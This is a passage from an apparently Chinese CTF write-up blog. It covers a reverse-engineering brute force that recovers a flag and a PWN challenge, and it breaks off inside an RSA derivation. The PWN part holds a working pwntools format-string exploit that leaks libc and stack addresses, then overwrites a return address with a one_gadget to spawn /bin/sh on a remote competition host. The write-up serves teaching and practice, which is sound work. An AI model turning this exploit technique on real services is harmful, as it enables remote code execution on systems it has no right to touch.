class="number">0x90909090</span>)</span><br><span class="line">        patch_dword(i + <span class="number">8</span>, <span class="number">0x90909090</span>)</span><br><span class="line">        patch_dword(i + <span class="number">12</span>, <span class="number">0x90909090</span>)</span><br><span class="line">        patch_dword(i + <span class="number">16</span>, <span class="number">0x90909090</span>)</span><br><span class="line">        patch_word(i + <span class="number">20</span>, <span class="number">0x9090</span>)</span><br><span class="line">        patch_byte(i + <span class="number">22</span>, <span class="number">0x90</span>)</span><br></pre></td></tr></table></figure><p>然后发现 main 函数还是不能直接反编译，把 <code>main</code> 到 <code>init</code> 之间的汇编全部 undefine 掉，然后重新创建函数即可，恢复出来的反编译代码还是比较清晰的</p><p>代码逻辑是根据 9 个输入把字符串拼接起来作为明文，然后用 <code>start_routine</code> 函数去把真正的密文解出来</p><p>后面跟着的几个函数把 key 解出来然后用 <code>sub_4011E0</code> 对明文进行加密</p><p><code>sub_4011E0</code> 先用 <code>sub_405E00</code> 处理明文，然后进行了一大堆操作</p><p>把密文 dump 出来：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /32xb 0x608090</span><br><span class="line">0x608090:       0xdd    0xb2    0x6d    0xf3    0xe6    0x0a    0xc7    0x83</span><br><span class="line">0x608098:       0x4a    0x93    0x50    0xb4    0xa4    0x59    0xab    0x0e</span><br><span class="line">0x6080a0:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x6080a8:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br></pre></td></tr></table></figure><p>放弃直接逆向了，考虑到所有可能的输入规模才 6^9，把 <code>sub_4011E0</code> 直接复制出来，暴力枚举得到输入 <code>051410233</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> enc[] = &#123;<span class="number">0x0F36DB2DD</span>, <span class="number">0x83C70AE6</span>, <span class="number">0x0B450934A</span>, <span class="number">0x0EAB59A4</span>&#125;;</span><br><span class="line"><span class="type">char</span> *s[] = &#123;<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;dog&quot;</span>, <span class="string">&quot;fox&quot;</span>, <span class="string">&quot;panda&quot;</span>, <span class="string">&quot;dragon&quot;</span>, <span class="string">&quot;monkey&quot;</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> str[<span class="number">128</span>];</span><br><span class="line"><span class="type">int</span> len, input[<span class="number">10</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> pt[<span class="number">16</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">gen</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">memset</span>(str, <span class="number">0</span>, <span class="keyword">sizeof</span>(str));</span><br><span class="line">  <span class="built_in">memset</span>(pt, <span class="number">0</span>, <span class="keyword">sizeof</span>(pt));</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) &#123;</span><br><span class="line">    len = <span class="built_in">strlen</span>(s[input[i]]);</span><br><span class="line">    <span class="built_in">strncat</span>(str, s[input[i]], len);</span><br><span class="line">  &#125;</span><br><span class="line">  len = <span class="built_in">strlen</span>(str);</span><br><span class="line">  str[len] = <span class="number">0x80</span>;</span><br><span class="line">  <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= len + <span class="number">6</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j += <span class="number">1</span>) pt[cnt] |= str[i + j] &lt;&lt; (j &lt;&lt; <span class="number">3</span>);</span><br><span class="line">    cnt++;</span><br><span class="line">  &#125;</span><br><span class="line">  pt[<span class="number">14</span>] = <span class="number">8</span> * len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">std</span>[] = &#123;<span class="number">0x0EFCDAB89</span>, <span class="number">0x67452301</span>, <span class="number">0x10325476</span>, <span class="number">0x98BADCFE</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ct[<span class="number">4</span>], key[<span class="number">4</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span><span class="params">()</span> &#123; <span class="comment">// sub_4011E0</span></span><br><span class="line">  <span class="built_in">memcpy</span>(ct, <span class="built_in">std</span>, <span class="keyword">sizeof</span>(<span class="built_in">std</span>));</span><br><span class="line">  <span class="built_in">memcpy</span>(key, <span class="built_in">std</span>, <span class="keyword">sizeof</span>(<span class="built_in">std</span>));</span><br><span class="line">  ......</span><br><span class="line">  ct[<span class="number">0</span>] += key[<span class="number">0</span>];</span><br><span class="line">  ct[<span class="number">1</span>] += key[<span class="number">1</span>];</span><br><span class="line">  ct[<span class="number">2</span>] += key[<span class="number">2</span>];</span><br><span class="line">  ct[<span class="number">3</span>] += key[<span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> p)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (p &gt; <span class="number">8</span>) &#123;</span><br><span class="line">    gen();</span><br><span class="line">    encrypt();</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) flag &amp;= enc[i] == ct[i];</span><br><span class="line">    <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[+] Input Found :&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, input[i]);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">    input[p] = i;</span><br><span class="line">    dfs(p + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123; dfs(<span class="number">0</span>); &#125;</span><br></pre></td></tr></table></figure><p>根据代码提示 <code>flag&#123;md5(input)&#125;</code> 得到 <code>flag&#123;839c998c52db6618bb24c346b85a894f&#125;</code></p><p>在网上还看见有师傅直接在标准输入输出流里爆破的：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建迭代器</span></span><br><span class="line">char_set = <span class="string">&quot;012345&quot;</span></span><br><span class="line">char_length = <span class="number">9</span></span><br><span class="line">all_combinations = product(char_set, repeat=char_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历组合并发送给进程</span></span><br><span class="line"><span class="keyword">for</span> combination <span class="keyword">in</span> all_combinations:</span><br><span class="line">    inp = <span class="string">&quot;&quot;</span>.join(combination)</span><br><span class="line">    p = Popen(<span class="string">&#x27;./main&#x27;</span>, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># 发送输入</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> inp:</span><br><span class="line">        p.stdin.write(i.encode()+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="comment">#print(i.encode())</span></span><br><span class="line">    p.stdin.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接收输出</span></span><br><span class="line">    res = p.stdout.read()</span><br><span class="line">    <span class="comment"># print(res.decode(&#x27;utf-8&#x27;))</span></span><br><span class="line">    res = res.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># 检查是否包含flag</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> res:</span><br><span class="line">        <span class="built_in">print</span>(inp)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="PWN">PWN</h2><h3 id="fmt">fmt</h3><p>拿到题先 <code>checksec</code>，发现保护全开</p><p>再看代码逻辑，内容非常简单就是两次格式化字符串</p><p>第一次先泄露出 <code>__libc_start_main_ret</code> 和栈基址</p><p>动调得知 <code>__libc_start_main_ret</code> 是 <code>__libc_start_main + 243</code>，拿到 libc 基址</p><p>由于保护全开，第二次利用想到 one_gadget</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ one_gadget ./libc-2.31.so    </span><br><span class="line">0xe3afe execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(<span class="string">&quot;/bin/sh&quot;</span>, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure><p>拿到 one_gadget 以后，要想办法把返回地址改成 gadget</p><p>但是地址太大一次不好写，又因为 <code>__libc_start_main_ret</code> 和 gadget 高位相同，因此可以只取 gadget 的低 6 位，然后再把低 6 位拆成 2 位和 4 位写入内存中</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;</span> % (s, addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./fmt&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;123.60.179.52&#x27;</span>, <span class="number">30223</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;b*$rebase(0x13af)&#x27;)</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;str: &#x27;</span>, <span class="string">&#x27;%21$p%18$p&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak_libc = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak_stack = <span class="built_in">int</span>(io.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;leak_stack&#x27;</span>, leak_stack)</span><br><span class="line">libc_base = leak_libc - (libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>] + <span class="number">243</span>)</span><br><span class="line"></span><br><span class="line">gadget = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>]</span><br><span class="line"></span><br><span class="line">target = (libc_base + gadget[<span class="number">1</span>]) % <span class="number">0x1000000</span></span><br><span class="line"></span><br><span class="line">low = target % <span class="number">0x10000</span></span><br><span class="line">high = target // <span class="number">0x10000</span></span><br><span class="line">lg(<span class="string">&#x27;target&#x27;</span>, target)</span><br><span class="line">lg(<span class="string">&#x27;low&#x27;</span>, low)</span><br><span class="line">lg(<span class="string">&#x27;high&#x27;</span>, high)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(high).encode() + <span class="string">b&#x27;c%11$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(low - high).encode() + <span class="string">b&#x27;c%10$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">32</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(leak_stack + <span class="number">8</span>) + p64(leak_stack + <span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;str: &#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="CRYPTO">CRYPTO</h2><h3 id="RSA">RSA</h3><p>由所给代码可知：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><msup><mi>p</mi><mn>7</mn></msup><mo>∗</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">N = p^7 * q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.68333em;vertical-align:0"></span><span class="mord mathnormal" style="margin-right:.10903em">N</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-.19444em"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.625em;vertical-align:-.19444em"></span><span class="mord mathnormal" style="margin-right:.03588em">q</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>h</mi><mi>i</mi><mo>=</mo><msup><mi>p</mi><mn>6</mn></msup><mo>∗</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">phi = p^6 * (p-1) * (q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.8888799999999999em;vertical-align:-.19444em"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-.19444em"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:.8141079999999999em"><span style="top:-3.063em;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:.03588em">q</span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>。</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>e</mi><mn>1</mn></msub><mo>∗</mo><msub><mi>d</mi><mn>1</mn></msub><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="1em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"><mi>p</mi><mi>h</mi><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e_1 * d_1 \equiv 1 \pmod{phi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.61528em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.84444em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.3333333333333333em"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span></span></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>e</mi><mn>2</mn></msub><mo>∗</mo><msub><mi>d</mi><mn>2</mn></msub><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="1em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"><mi>p</mi><mi>h</mi><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e_2 * d_2 \equiv 1 \pmod{phi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.61528em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.84444em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:.3333333333333333em"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mclose">)</span></span></span></span></span></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>d</mi><mn>1</mn></msub><mo>+</mo><mi>x</mi><mo>=</mo><msub><mi>d</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">d_1 + x = d_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.84444em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:.43056em;vertical-align:0"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.84444em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span></span></span></span></span></p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>e</mi><mn>2</mn></msub><mo>∗</mo><mo stretchy="false">(</mo><msub><mi>d</mi><mn>1</mn></msub><mo>+</mo><mi>x</mi><mo stretchy="false">)</mo><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="1em"><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"><mi>p</mi><mi>h</mi><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e_2 * (d_1 + x) \equiv 1 \pmod{phi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:.61528em;vertical-align:-.15em"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:.30110799999999993em"><span style="top:-2.5500000000000003em;margin-left:0;margin-right:.05em"><span class="pstrut" style="height:2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:.15em"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:.2222222222222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right:.2222222222222222em"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-.25em"></span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:.2777777777777778em"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:.2777777777777778em"></span></span><span class="base"><span class="strut" style="height:.64444em;vertical-align:0"></span><span 